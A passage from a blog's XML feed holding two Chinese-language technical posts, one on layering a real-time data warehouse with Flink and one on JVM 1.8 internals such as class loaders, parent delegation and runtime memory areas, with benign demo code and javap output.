    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Flink：1.12.0</p><p>java：1.8</p><h2 id="一、实时数仓简介"><a href="#一、实时数仓简介" class="headerlink" title="一、实时数仓简介"></a>一、实时数仓简介</h2><h3 id="1、分层介绍"><a href="#1、分层介绍" class="headerlink" title="1、分层介绍"></a>1、分层介绍</h3><ul><li>ODS，数据采集层，采集原始数据、日志、业务数据等</li><li>DWD，对ODS层的数据进行初步处理，并根据业务逻辑进行分流</li><li>DIM，维度数据，存储一些<strong>元数据信息</strong>，放在hbase</li><li>DWM，对于DWD数据对象进行进一步加工，常常是DWD和DIM进行关联，形成宽表</li><li>DWS，对DWM数据根据某个主题进行轻度聚合，进行主题宽表，放在clickhouse</li><li>ADS，把DWS层数据根据可视化需求进行筛选聚合，不存储，而是直接查询，形成一个接口</li></ul><h3 id="2、实时计算和离线计算"><a href="#2、实时计算和离线计算" class="headerlink" title="2、实时计算和离线计算"></a>2、实时计算和离线计算</h3><p><strong>实时计算</strong>：输入数据可以以流的方式一个个输入并进行处理，即并不知道全部数据有多大，来一个处理一个。适合运算时间短、计算量级较小的业务。比如当前商品库存，当一个顾客下单后，需要实时对库存数据进行实时处理。</p><p><strong>离线计算</strong>：计算之前已经知道全部的输入数据，且输入数据并不会发生变化。这种业务一般运算时间长、计算量较大，需要放在后台离线计算。比如计算上个月的网站访问量、去年某商品的销售额。</p><p><strong>即席查询</strong>：临时的业务，可能是老板为了装逼临时分派给你的查询任务。</p><p>Presto：当场计算（基于内存速度块）</p><p>Kylin：预计算（提前算好），多维分析（各个维度组合的结果都帮你算好）</p><h3 id="3、需求"><a href="#3、需求" class="headerlink" title="3、需求"></a>3、需求</h3><ul><li>日常统计报表或分析图实时数据变化</li><li>实时数据展示</li><li>数据预警或提示</li><li>实时推荐系统</li></ul><h2 id="一、数据采集（ODS）"><a href="#一、数据采集（ODS）" class="headerlink" title="一、数据采集（ODS）"></a>一、数据采集（ODS）</h2><p>ODS：Operation Data Store，数据准备区。</p><p>功能：采集原始数据、日志和业务数据，写入kafka</p><p>kafka topic：ods_base_log</p><h2 id="二、初步处理及分流（DWD）"><a href="#二、初步处理及分流（DWD）" class="headerlink" title="二、初步处理及分流（DWD）"></a>二、初步处理及分流（DWD）</h2><p>DWD：data warehouse details，细节数据层。</p><p>功能：主要对ODS数据层做一些数据清洗、规范化以及分流的操作。</p><ul><li><p>数据清洗：剔除非法值、脏数据等</p></li><li><p>数据分流：按照不同的业务需求，将数据拆分，输出到下游的kafka的不同topic中。</p></li></ul><p><font color="Red">重点：需要分流的逻辑一般以某种形式写在配置中，而不能在代码中写死。</font></p><p><font color="Red">而在实际工作中，这一层一般会通过搭一个平台来实现动态增加或减少分流逻辑。</font></p><p><font color="Red">实现原理就是将分流逻辑配置在数据库中，再将数据库中这个配置表通过flinkcdc生成一个广播流，将这个广播流和ods流连接合并，就可以根据配置实现动态分流。</font></p><h2 id="三、维度数据（DIM）"><a href="#三、维度数据（DIM）" class="headerlink" title="三、维度数据（DIM）"></a>三、维度数据（DIM）</h2><p>DIM：Dimension，维度数据，一般就是一些业务基本信息的数据，包含：</p><p>高基数维度数据：用户资料、商品资料等业务相关的基本信息。</p><p>低基数维度数据：配置表、数据字典等，如业务相关枚举值及其含义等。</p><blockquote><p>问：维度数据为什么不放在redis，而放在hbsae？</p></blockquote><p>答：有些维度表会随时间扩大，比如用户信息，放redis太占内存，一些在可预见的未来不会膨胀的维度数据实际上是可以放redis的。（该问题一般不能从持久化的角度来回答，实际场景下，肯定会有数据库作为持久化存储）</p><blockquote><p>问：维度数据为什么不直接取数据库，而是取hbase？</p></blockquote><p>答：数据库一般是业务本身要用来做增删改查的，大数据处理和分析模块再请求数据库，会对数据库造成压力。</p><h2 id="四、数据中间层（DWM）"><a href="#四、数据中间层（DWM）" class="headerlink" title="四、数据中间层（DWM）"></a>四、数据中间层（DWM）</h2><p>DWM：Data WareHouse Middle，数据中间层，即从DWD到DWS中间，会有很多复用的部分，将这些可复用的部分的数据加工提出出来作为一层，避免重复劳动。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Flink：1.12.0&lt;/p&gt;
&lt;p&gt;java：1.8&lt;/p&gt;
&lt;h2 id=&quot;一、实时数仓简介&quot;&gt;&lt;a href=&quot;#一、实时数仓简介&quot;</summary>
      
    
    
    
    <category term="bigdata" scheme="https://yury757.github.io/categories/bigdata/"/>
    
    
  </entry>
  
  <entry>
    <title>JVM-1.8-memory-and-garbage-collect</title>
    <link href="https://yury757.github.io/java/JVM/jvm-1.8"/>
    <id>https://yury757.github.io/java/JVM/jvm-1.8</id>
    <published>2021-09-19T16:00:00.000Z</published>
    <updated>2021-10-06T07:29:23.639Z</updated>
    
    <content type="html"><![CDATA[<p>JVM版本：HotSpot 1.8</p><p>推荐书籍：</p><ul><li>《The Java Virtual Machine Specification》（<a href="https://docs.oracle.com/javase/specs/jvms/se8/jvms8.pdf">The Java® Virtual Machine Specification (oracle.com)</a>）</li><li>《深入理解java虚拟机——JVM高级特性与最佳实践》</li></ul><h2 id="一、JVM简介"><a href="#一、JVM简介" class="headerlink" title="一、JVM简介"></a>一、JVM简介</h2><h3 id="1、JVM是什么"><a href="#1、JVM是什么" class="headerlink" title="1、JVM是什么"></a>1、JVM是什么</h3><p>狭义上来说，JVM是java运行的平台。</p><p>广义上来说，It is the component of the technology responsible for its hardware- and operating system independence, the small size of its compiled code, and its ability to protect users from malicious programs. 即JVM是一个操作系统或硬件与用户程序之间的一个接口或平台，这个接口可以使用户的程序与不同的操作系统或硬件独立开，只要程序运行在这个平台上，就可以对不同的操作系统或硬件进行相同的操作，就像一个虚拟的计算机，可以执行一系列的虚拟计算机指令。</p><p>虚拟机分为两类：</p><ul><li>系统虚拟机，虚拟一个操作系统的运行环境（模拟硬件），如VMWare，是操作系统的运行环境，可以安装window、Linux等。</li><li>程序虚拟机，虚拟一个普通应用程序的运行环境（模拟软件），如JVM，是二进制字节码的运行环境。</li></ul><p>java SE架构：<a href="https://docs.oracle.com/javase/8/docs/">Java Platform Standard Edition 8 Documentation (oracle.com)</a>，JVM处于最底层，即java的运行环境。</p><h3 id="2、JVM厂商"><a href="#2、JVM厂商" class="headerlink" title="2、JVM厂商"></a>2、JVM厂商</h3><p>JVM和JVM规范（JVM Specification）不一样，JVM规范是一套规范，并不是JVM本身，而JVM是基于这套规范的实现，java官网上的JVM只是Oracle（Sun）对JVM规范的一个实现版本，不过还有其他厂商实现的JVM，如：</p><ul><li><p>Oracle HotSpot（<a href="https://www.oracle.com/java/technologies/downloads/#java8">Java Downloads | Oracle</a>）（里面有很多历史，可以了解一下）</p></li><li><p>Microsoft OpenJDK（<a href="https://www.microsoft.com/openjdk">Microsoft Build of OpenJDK</a>）</p></li><li><p>Alibaba Dragonwell（<a href="https://developer.aliyun.com/opensource/project/alibabadragonwell">开发者平台_开发者中心 (aliyun.com)</a>）</p></li><li><p>Azul OpenJDK（<a href="https://www.azul.com/downloads/azure-only/">Azure Only Downloads - Azul | Better Java Performance, Superior Java Support</a>）</p></li><li><p>Red Hat OpenJDK（<a href="https://developers.redhat.com/products/openjdk/download">OpenJDK Download | Red Hat Developer</a>）</p></li><li><p>Amazon Corretto（<a href="https://aws.amazon.com/cn/corretto/">Amazon Corretto-OpenJDK 的免费多平台发行版-AWS云服务</a>）</p></li></ul><pre><code class="shell"># Oraclejava version &quot;13.0.2&quot; 2020-01-14Java(TM) SE Runtime Environment (build 13.0.2+8)Java HotSpot(TM) 64-Bit Server VM (build 13.0.2+8, mixed mode, sharing)# Microsoftopenjdk version &quot;11.0.12&quot; 2021-07-20OpenJDK Runtime Environment Microsoft-25199 (build 11.0.12+7)OpenJDK 64-Bit Server VM Microsoft-25199 (build 11.0.12+7, mixed mode)# Alibabaopenjdk version &quot;1.8.0_302&quot;OpenJDK Runtime Environment (Alibaba Dragonwell 8.8.8) (build 1.8.0_302-b01)OpenJDK 64-Bit Server VM (Alibaba Dragonwell 8.8.8) (build 25.302-b01, mixed mode)# 不同的Linux发行版会提供OpenJDK或其变体作为系统默认的JVM实现openjdk version &quot;1.8.0_292&quot;OpenJDK Runtime Environment (build 1.8.0_292-8u292-b10-0ubuntu1~18.04-b10)OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)</code></pre><h3 id="3、跨语言平台"><a href="#3、跨语言平台" class="headerlink" title="3、跨语言平台"></a>3、跨语言平台</h3><p>JVM是一个跨语言的平台，只要对应的编译器按照一定的规范（JSR-292）能生成JVM可以识别的字节码文件，就可以运行其他语言的程序，而不仅仅是java。</p><p>因此java的强大之处并不在于java语言本身，而更在于JVM的强大。</p><p><img src="/images/JVM%E8%B7%A8%E8%AF%AD%E8%A8%80%E5%B9%B3%E5%8F%B0.png"></p><h3 id="4、JVM整体结构"><a href="#4、JVM整体结构" class="headerlink" title="4、JVM整体结构"></a>4、JVM整体结构</h3><p>JVM主要分为三个区域：</p><ul><li>类加载子系统</li><li>运行时数据区</li><li>执行引擎</li></ul><p><img src="/images/JVM%E6%95%B4%E4%BD%93%E7%BB%93%E6%9E%84.png"></p><h3 id="5、java代码执行流程"><a href="#5、java代码执行流程" class="headerlink" title="5、java代码执行流程"></a>5、java代码执行流程</h3><ul><li>java编译器（如javac）编译成.class字节码文件（前端编译器）<ul><li>词法分析</li><li>语法分析</li><li>语法/抽象语法树</li><li>语义分析</li><li>注解抽象语法树</li><li>字节码生成器</li></ul></li><li>JVM<ul><li>类加载</li><li>字节码校验</li><li>解释器，逐行将字节码翻译成机器指令，解析执行</li><li>JIT编译器（后端编译器），对字节码整体进行编译再执行，区别在于JIT会缓存一些热点代码等，优化执行效率</li></ul></li></ul><p><font color="Red">注意：解释器和JIT编译器属于JVM的执行引擎下，可以共存，但是不会同时运行，JIT编译器和解释器只能选其中一种来执行，但是并不是在JVM的整个生命周期内只能选一种运行，而是可以切换运行，根据当前要执行的代码的特征，JVM会选择其中一种来执行。</font></p><h3 id="6、class文件反编译"><a href="#6、class文件反编译" class="headerlink" title="6、class文件反编译"></a>6、class文件反编译</h3><p>通过javap命令可以对.class文件进行反编译，查看字节码指令。</p><pre><code class="shell">javap -v Demo01.classClassfile /D:/Adocument/Java/JVM/out/production/c1-memory-and-garbage-collect/net/yury/demo/Demo01.class  Last modified 2021-9-20; size 580 bytes  MD5 checksum fa60e763603ba1e3f645376ecc25e0ac  Compiled from &quot;Demo01.java&quot;public class net.yury.demo.Demo01  minor version: 0  major version: 52  flags: ACC_PUBLIC, ACC_SUPERConstant pool:   #1 = Methodref          #5.#23         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V   #2 = Fieldref           #24.#25        // java/lang/System.out:Ljava/io/PrintStream;   #3 = Methodref          #26.#27        // java/io/PrintStream.println:(I)V   #4 = Class              #28            // net/yury/demo/Demo01   #5 = Class              #29            // java/lang/Object   #6 = Utf8               &lt;init&gt;   #7 = Utf8               ()V   #8 = Utf8               Code   #9 = Utf8               LineNumberTable  #10 = Utf8               LocalVariableTable  #11 = Utf8               this  #12 = Utf8               Lnet/yury/demo/Demo01;  #13 = Utf8               main  #14 = Utf8               ([Ljava/lang/String;)V  #15 = Utf8               args  #16 = Utf8               [Ljava/lang/String;  #17 = Utf8               a  #18 = Utf8               I  #19 = Utf8               b  #20 = Utf8               c  #21 = Utf8               SourceFile  #22 = Utf8               Demo01.java  #23 = NameAndType        #6:#7          // &quot;&lt;init&gt;&quot;:()V  #24 = Class              #30            // java/lang/System  #25 = NameAndType        #31:#32        // out:Ljava/io/PrintStream;  #26 = Class              #33            // java/io/PrintStream  #27 = NameAndType        #34:#35        // println:(I)V  #28 = Utf8               net/yury/demo/Demo01  #29 = Utf8               java/lang/Object  #30 = Utf8               java/lang/System  #31 = Utf8               out  #32 = Utf8               Ljava/io/PrintStream;  #33 = Utf8               java/io/PrintStream  #34 = Utf8               println  #35 = Utf8               (I)V&#123;  public net.yury.demo.Demo01();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=1, locals=1, args_size=1         0: aload_0         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V         4: return      LineNumberTable:        line 3: 0      LocalVariableTable:        Start  Length  Slot  Name   Signature            0       5     0  this   Lnet/yury/demo/Demo01;  public static void main(java.lang.String[]);    descriptor: ([Ljava/lang/String;)V    flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=2, locals=4, args_size=1         0: iconst_4         1: istore_1         2: iconst_3         3: istore_2         4: iload_1         5: iload_2         6: iadd         7: istore_3         8: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;        11: iload_1        12: invokevirtual #3                  // Method java/io/PrintStream.println:(I)V        15: return      LineNumberTable:        line 5: 0        line 6: 2        line 7: 4        line 8: 8        line 9: 15      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      16     0  args   [Ljava/lang/String;            2      14     1     a   I            4      12     2     b   I            8       8     3     c   I&#125;SourceFile: &quot;Demo01.java&quot;</code></pre><p>JVM是基于栈的架构，不同CPU架构不同，因此不能基于寄存器来设计。</p><h3 id="7、JVM生命周期"><a href="#7、JVM生命周期" class="headerlink" title="7、JVM生命周期"></a>7、JVM生命周期</h3><ul><li><strong>启动</strong>：Java虚拟机的启动是通过<strong>引导类加载器</strong>（bootstrap class loader）创建一个初始类（initial class）来完成的，这个初始类是由虚拟机的具体实现来指定的，不同实现版本的JVM的类可能不一样。</li><li><strong>执行</strong>：JVM执行的任务就是执行用户程序，即执行一个java程序，实际上是执行一个JVM进程，而用户程序只不过在这个进程上运行。</li><li><strong>退出</strong>：程序正常终止、异常或错误而终止、操作系统错误终止、某个线程调用Runtime类或System类的exit方法或其他方法手动终止程序等都会导致程序退出，程序终止则JVM也退出。</li></ul><h2 id="二、类加载子系统"><a href="#二、类加载子系统" class="headerlink" title="二、类加载子系统"></a>二、类加载子系统</h2><p>类加载子系统（class loader subsystem）负责加载.class字节码文件。</p><p>类加载过程分为一下几个步骤：加载、链接、初始化。</p><h3 id="1、加载"><a href="#1、加载" class="headerlink" title="1、加载"></a>1、加载</h3><ul><li>通过全限定类名获取定义此类的二进制流（本地文件，网络，<font color="Red">动态代理</font>，<font color="Red">JSP生成</font>）</li><li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li><li>在内存中生成一个代表这个类的java.lang.Class对象（详见反射），作为方法区这个类的各种数据的访问入口</li></ul><h3 id="2、链接"><a href="#2、链接" class="headerlink" title="2、链接"></a>2、链接</h3><ul><li><strong>验证</strong>：验证class字节码文件是否符合当前JMV规范，保证类被正确地加载并不会危害JVM本身。主要有：文件格式验证、元数据验证、字节码验证、符号引用验证。</li><li><strong>准备</strong>：为变量分配内存，并设置该变量的默认值。用final static修饰的变量在编译成class文件时就会分配值，因而这种变量在这个阶段就会直接赋值。这里不会为示例变量分配初始化值，类变量会分配在方法区中，而实例变量是会随着对象一起分配到java堆中。</li><li><strong>解析</strong>：将内存池中的符号引用转换为直接引用。即比如我们引用了一个java.Lang.String类，会产生一个对这个类的符号引用，等其他类都准备好了之后，将符号引用转换为地址引用这样的直接引用。解析动作主要针对类或接口、字段、类方法、接口方法、方法类型等。</li></ul><h3 id="3、初始化"><a href="#3、初始化" class="headerlink" title="3、初始化"></a>3、初始化</h3><p>这个初始化并不是初始化实例，而是类的初始化。</p><ul><li>执行类构造器方法&lt;clinit&gt;()的过程。此方法不需要定义，是javac编译器自动收集类中的所有类变量的赋值动作和静态代码块中的语句合并而来。即执行所有static变量或static代码块相关的初始化操作，若没有这两类操作，则不会产生对应的&lt;clinit&gt;()方法。</li><li>初始化顺序是按照代码在源文件中的顺序执行</li><li>若该类具有父类，则必须先执行父类的&lt;clinit&gt;()方法，父类初始化完成后，才能初始化子类。</li><li>JVM必须保证一个类的&lt;clinit&gt;()方法在多线程中被同步加锁，保证只能被加载一次。</li></ul><pre><code class="java">package net.yury.demo;public class Demo02 &#123;    public static void main(String[] args) &#123;        Runnable task = ()-&gt;&#123;            System.out.println(Thread.currentThread().getName() + &quot;开始&quot;);            AnotherClass deadThread = new AnotherClass();            System.out.println(Thread.currentThread().getName() + &quot;结束&quot;);        &#125;;        Thread thread1 = new Thread(task, &quot;thread-1&quot;);        Thread thread2 = new Thread(task, &quot;thread-2&quot;);        thread1.start();        thread2.start();    &#125;&#125;class AnotherClass &#123;    static &#123;        System.out.println(Thread.currentThread().getName() + &quot;正在初始化&quot;);        try &#123;            Thread.sleep(1000);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;        System.out.println(Thread.currentThread().getName() + &quot;初始化结束&quot;);    &#125;&#125;</code></pre><p>如以上代码执行时最多一个线程进入AnotherClass的static代码块去执行，要么是thread-1，要么是thread-2。</p><pre><code class="java">thread-1开始thread-2开始thread-1正在初始化thread-1初始化结束thread-1结束thread-2结束</code></pre><h3 id="4、类加载器（重点）"><a href="#4、类加载器（重点）" class="headerlink" title="4、类加载器（重点）"></a>4、类加载器（重点）</h3><p>按被加载的被的类的类型划分，类加载分为一下几种：</p><ul><li>引导类加载器（Bootstrap ClassLoader）</li><li>扩展类加载器（Extension ClassLoader）</li><li>应用程序类加载器（Application ClassLoader）</li><li>用户自定义类加载器（意为用户自定义的<strong>类加载器</strong>，而不是<strong>用户自定义类</strong>的加载器，没有加载器这个东西，只有类加载器）</li></ul><p>而按照JVM的标准，后面三种都叫用户自定义类加载器。<font color="Red">所有直接或间接派生于ClassLoader的类加载器都是用户自定义类加载器</font>。如扩展类加载器（ExtClassLoader）间接继承了ClassLoader。</p><p>Launcher类是JVM的一个入口应用，后面可以看到扩展了加载器和应用程序类加载器都是Launcher类里面的内部类。</p><h4 id="（1）引导类加载器"><a href="#（1）引导类加载器" class="headerlink" title="（1）引导类加载器"></a>（1）引导类加载器</h4><p>引导类加载器为C/C++编写，用于引导java的核心类库（JAVA_HOME/jre/lib/rt.jar、resources.jar、sun.boot.class.path路径下的内容），用于提供JVM启动运行自身需要的类。</p><p><font color="Red">扩展类加载器和应用程序类加载器也是一个类，因此引导类加载器用于还用于加载这两个特殊的类。</font></p><p>出于安全考虑，Bootstrap类加载器只加载包含java、javax、sun等开头的类。</p><p>引导类加载器加载的类，调用getClassLoader()方法返回null。</p><pre><code class="java">package net.yury.demo;import com.sun.net.ssl.internal.ssl.Provider;import sun.misc.Launcher;import java.net.URL;public class Demo03BootstrapClassLoader &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;bootstrap引导类加载器加载的路径为：&quot;);        URL[] urLs = Launcher.getBootstrapClassPath().getURLs();        for (URL urL : urLs) &#123;            System.out.println(urL.toString());        &#125;        ClassLoader classLoader = Provider.class.getClassLoader();        System.out.println(classLoader);    &#125;&#125;/*bootstrap引导类加载器加载的路径为：file:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/resources.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/rt.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/sunrsasign.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/jsse.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/jce.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/charsets.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/lib/jfr.jarfile:/D:/Program%20Files%20(x86)/Java/jdk1.8.0_201/jre/classesnull*/</code></pre><h4 id="（2）扩展类加载器"><a href="#（2）扩展类加载器" class="headerlink" title="（2）扩展类加载器"></a>（2）扩展类加载器</h4><p>java语言编写，由sun.misc.Launcher$ExtClassLoader实现，继承于ClassLoader，该类由Bootstrap引导类加载器加载。</p><p>加载的类目录为指定的java.ext.dirs系统属性目录，若没指定则默认为JAVA_HOME/jre/lib/ext，当用户写了一个类放入这个目录下也会被加载。</p><pre><code class="java">package net.yury.demo;import sun.security.ec.CurveDB;public class Demo04ExtClassLoader &#123;    public static void main(String[] args) &#123;        String property = System.getProperty(&quot;java.ext.dirs&quot;);        System.out.println(property);        ClassLoader classLoader = CurveDB.class.getClassLoader();        System.out.println(classLoader);    &#125;&#125;/*D:\Program Files (x86)\Java\jdk1.8.0_201\jre\lib\ext;C:\WINDOWS\Sun\Java\lib\extsun.misc.Launcher$ExtClassLoader@4b67cf4d*/</code></pre><h4 id="（3）应用程序类加载器"><a href="#（3）应用程序类加载器" class="headerlink" title="（3）应用程序类加载器"></a>（3）应用程序类加载器</h4><p>应用程序类加载器也叫系统类加载器，java语言编写，由sun.misc.Launcher$AppClassLoader实现，继承于ClassLoader，该类由扩展类加载器加载。</p><p>加载的类的目录为指定的java.class.path系统属性目录。</p><p><font color="Red">该类加载器是java应用程序的默认类加载器，即java应用的类一般都是由这个类加载器加载的。</font></p><pre><code class="java">package net.yury.demo;public class Demo05AppClassLoader &#123;    public static void main(String[] args) &#123;        ClassLoader classLoader = Demo05AppClassLoader.class.getClassLoader();        System.out.println(classLoader);    &#125;&#125;/*sun.misc.Launcher$AppClassLoader@18b4aac2*/</code></pre><p>总结如下：</p><p><img src="/images/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%B1%BB%E5%9E%8B.png"></p><h4 id="（4）用户自定义类加载器"><a href="#（4）用户自定义类加载器" class="headerlink" title="（4）用户自定义类加载器"></a>（4）用户自定义类加载器</h4><p>不适用以上三种类加载器，而是用户自定义一个类加载器，来加载需要加载的类。</p><p>为什么需要自定义类加载器？</p><ul><li>隔离加载类</li><li>修改类的加载方式</li><li>扩展加载源</li><li>防止源码泄露</li></ul><p>定义用户自定义类的两个方法：</p><ul><li>继承ClassLoader类，重写findClass方法，JDK1.2之前要重写loadClass方法</li><li>继承URLClassLoader类，按照需求重写部分方法</li><li>将URLClassLoader类作为一个参考模板，模仿重写一个适应自己需求的一个类</li></ul><h4 id="（5）获取类加载器的方式"><a href="#（5）获取类加载器的方式" class="headerlink" title="（5）获取类加载器的方式"></a>（5）获取类加载器的方式</h4><ul><li>Class.getClassLoader()</li><li>Thread.currentThread().getContextClassLoader()</li><li>ClassLoader.getSystemClassLoader()</li><li>DriverManager.getCallerCLassLoader()</li></ul><h3 id="5、双亲委派机制（重点）"><a href="#5、双亲委派机制（重点）" class="headerlink" title="5、双亲委派机制（重点）"></a>5、双亲委派机制（重点）</h3><p>JVM对class文件采用的是<font color="Red">按需加载</font>的方式加载，即在要用到这个类时才会将这个类加载进内存中生成class对象。而加载某个类时，JVM加载类时采用的是<font color="Red">双亲委派机制</font>，是一种任务委派模式。</p><p>双亲委派机制原理如下：</p><ul><li>当一个类加载器收到加载类的请求时，并不会自己去加载这个类，而是将这个请求委托给父类去加载</li><li>父类加载器收到加载请求后，会继续向上委托，最终到达Bootstrap ClassLoader</li><li>在这个递归的过程中，如果父类加载器完成了加载过程，则成功返回，否则才让子类加载器去完成类加载，知道这个类完成加载。</li></ul><p>注：“父类加载器“的断句为”<strong>父 类加载器</strong>“，还是一个类加载器，而不是父类的类加载器。类加载器可以通过调用getParent()方法获取其父类加载器。</p><pre><code class="java">/** * Returns the parent class loader for delegation. Some implementations may * use &lt;tt&gt;null&lt;/tt&gt; to represent the bootstrap class loader. This method * will return &lt;tt&gt;null&lt;/tt&gt; in such implementations if this class loader&#39;s * parent is the bootstrap class loader. */public final ClassLoader getParent() &#123;&#125;</code></pre><p><font color="Red">就像注释中说的，类加载器在任务委派方面是存在父子这种层次关系的，上面一节中讲到的不同类型的类加载器可以加载那些类，只是说明了它拥有加载这些类的能力，而不是说这些类一定由这个类加载器加载。而某个类最终由哪个类加载器加载，取决于可以加载这个类的最高级别的类加载器。</font></p><p>类加载器在任务委派方面的级别从高到低依次如下：</p><ul><li>Bootstrap ClassLoader</li><li>Extension ClassLoader</li><li>Application ClassLoader</li><li>UserDefined ClassLoader</li></ul><p>例如用户定义了一个java.lang.String类，而用户在使用这个类时，并不会找到用户定义的这个类，而是用了bootstrap classloader加载的rt.jar包下的java.lang.String类。因为通过双亲委派机制加载类时，加载任务不会直接进行，而是从最底层一直往上传递，最顶层的bootstrap classloader可以完成这个类的加载，于是直接完成了加载并返回class对象了，并不会将加载任务继续返还给子类加载器加载。代码略。</p><p>机制的优点：</p><ul><li>避免类被重复加载</li><li>保护程序安全，防止核心api被随意篡改</li></ul><h3 id="6、识别同一个类"><a href="#6、识别同一个类" class="headerlink" title="6、识别同一个类"></a>6、识别同一个类</h3><p>JVM中识别两个对象是否属于同一个类，包含以下两个校验：</p><ul><li>全限定类名是否相同</li><li>这两个对象的类是否由同一个类加载器加载的</li></ul><h3 id="7、类的主动使用和被动使用"><a href="#7、类的主动使用和被动使用" class="headerlink" title="7、类的主动使用和被动使用"></a>7、类的主动使用和被动使用</h3><p>主动使用包括：</p><ul><li>创建类实例</li><li>访问类或接口的静态变量，或对该静态变量进行赋值</li><li>调用类的静态方法</li><li>反射</li><li>初始化一个类的子类</li><li>JVM启动时被标明为启动类的类</li><li>JDK7开始提供的动态语言支持：java.lang.invoke.MethodHandler实例的解析结果</li></ul><p>除了以上几种情况为主动使用，其他均为被动使用。<font color="Red">类的被动使用不会导致类的初始化，即不会执行对应的&lt;clinit&gt;()方法</font>。</p><h2 id="三、运行时数据区"><a href="#三、运行时数据区" class="headerlink" title="三、运行时数据区"></a>三、运行时数据区</h2><h3 id="1、组成"><a href="#1、组成" class="headerlink" title="1、组成"></a>1、组成</h3><ul><li>方法区（JDK1.8叫元空间metaspace，或堆外内存）</li><li>JVM堆</li><li>程序计数器</li><li>本地方法栈</li><li>JVM栈</li></ul><p><font color="Red">其中方法区和JVM堆的生命周期和JVM进程的生命周期一样，而程序计数器、本地方法栈、JVM栈的生命周期和程序线程的生命周期一样，每有一个线程， 就会有一个自身的程序计数器、本地方法栈、JVM栈。</font></p><p><img src="/images/JVM%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA.png"></p><h3 id="2、线程"><a href="#2、线程" class="headerlink" title="2、线程"></a>2、线程</h3><p><font color="Red">在HotSpot JVM中，每个线程都与操作系统中的本地线程直接映射。java线程准备好时，操作系统中对应的本地线程也同时创建；java线程终止时，本地线程也会回收。</font></p><p><strong>普通线程</strong>：用户应用程序需要执行一定的工作而创建的工作线程。JVM虚拟机在所有普通线程终止时自动终止。</p><p><strong>守护线程</strong>：驻立在后台的线程，用于服务普通线程的线程，当JVM虚拟机准备终止时，守护线程才会终止。</p><p>HotSpot JVM中的守护线程主要有：</p><ul><li>JVM线程</li><li>周期任务线程</li><li>GC线程</li><li>编译线程</li><li>信号调度线程</li></ul><h3 id="3、程序计数器（PC寄存器）"><a href="#3、程序计数器（PC寄存器）" class="headerlink" title="3、程序计数器（PC寄存器）"></a>3、程序计数器（PC寄存器）</h3><p>英文全称：Program Counter Register。它是对CPU的寄存器的一种抽象模拟。</p><p>PC寄存器用来<font color="Red">存储指向下一条指令的地址</font>，也即将要执行的指令代码。由执行引擎读取下一条指令。它是程序控制流的指示器，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。可以理解为数据库中的游标，或集合的迭代器。</p><p>线程私有，和线程的生命周期一致。</p><p><font color="Red">没有GC，且是唯一一个在JVM规范中没有规定任何OOM情况的区域。</font></p><pre><code class="java">package net.yury.demo;public class Demo06PCRegister &#123;    public static void main(String[] args) &#123;        int i = 10;        int j = 20;        int k = i + j;        String s = &quot;yury&quot;;        System.out.println(s);    &#125;&#125;</code></pre><p>对于上面这段代码反编译后的指令如下：</p><p><img src="/images/pc%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><p><strong>问题1：为什么要用PC寄存器？</strong></p><p>因为CPU需要不断地在各个线程之间切换运行，需要有一个东西记录CPU需要运行的下一条指令的位置，不然CPU从其他线程切换回来不知道从哪里开始。</p><p><strong>问题2：PC寄存器为什么是线程私有的？</strong></p><p>因为PC寄存器是记录每个线程的下一条指令的位置，和线程相关，因此要每个线程独享一份PC寄存器。如果设计成公用的，则需要将对应线程的id也记录进去（即一种key-value形式的数据结构存储），而在创建线程和销毁线程时还要对这个数据结构进行操作，又涉及并发问题，稍显麻烦。而PC寄存器的占用内存及其小，因此设计成和线程绑定，随着线程生命周期创建或销毁，使用起来更方便。</p><h3 id="4、JVM栈"><a href="#4、JVM栈" class="headerlink" title="4、JVM栈"></a>4、JVM栈</h3><p>英文全称：Java Virtual Machine Stacks。</p><p><font color="Red">栈是运行时的单位，而堆是存储的单位。栈解决程序运行的问题，即程序如何运行，或者说如何处理数据。堆解决的是数据存储的问题，即数据怎么放，放在那里。</font></p><p><font color="Red">JVM栈内部存储的是一个个的栈帧，对应着一次次的方法调用，当前线程每调用一个方法，则将该方法入栈，栈顶元素即为正在运行的方法，当前方法运行结束后则栈顶元素出栈</font>。主管java程序的运行，每个栈帧中保存方法的局部变量、部分结果，并参与方法的调用和返回。</p><p>线程私有，和线程的生命周期一致。</p><p>不存在GC，但是存在OOM。</p><p>JVM允许JVM栈的大小是动态的或者固定不变的。若栈大小是固定的，则可能存在<strong>StackOverflowError</strong>异常；若栈大小是动态的，则可能存在<strong>OutOfMemoryError</strong>异常。</p><p><font color="Red">设置栈的大小</font>：在JVM参数设置里面加上<code>-Xss1024</code>即可设置栈空间的大小；默认单位是bytes，加上<code>k</code>则以kb为单位，同样加上<code>m</code>则以mb为单位。</p><h4 id="（1）栈帧"><a href="#（1）栈帧" class="headerlink" 